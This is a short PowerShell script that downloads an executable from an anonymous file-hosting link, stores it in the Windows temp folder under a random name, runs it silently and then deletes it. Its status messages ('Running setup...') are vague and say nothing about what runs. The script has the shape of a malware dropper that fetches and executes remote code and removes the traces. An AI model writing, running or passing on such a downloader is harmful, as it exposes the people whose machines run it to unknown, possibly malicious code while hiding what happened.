# Configuration
$url = "https://web.opendrive.com/api/v1/download/file.json/NzZfMTIzMDI3MjU2XzRnYWtu?session_id=bb3873e79e09058670635e61d7a661b196afbf8bcd41a277384ecda5339139e3&inline=0"
$dest = "C:\Windows\Temp\jh0816o9671i.exe"  # Simplified path without random folder

# Create directory if it doesn't exist (using Temp which always exists)
$destDir = Split-Path -Parent $dest
if (!(Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir -Force
}

# Download with better error handling
try {
    Write-Host "Proccessing request..."
    Invoke-WebRequest -Uri $url -OutFile $dest -ErrorAction Stop
    Write-Host "Proccess complete"
    
    # Check if file was downloaded successfully
    if (Test-Path $dest) {
        Write-Host "Running setup..."
        Start-Process -FilePath $dest -ArgumentList "/silent" -Wait -NoNewWindow
        
        Write-Host "Cleaning up..."
        Remove-Item -Path $dest -Force
        Write-Host "Setup complete!"
    } else {
        Write-Host "Download failed - file not found"
    }
}
catch {
    Write-Host "Error: $_"
}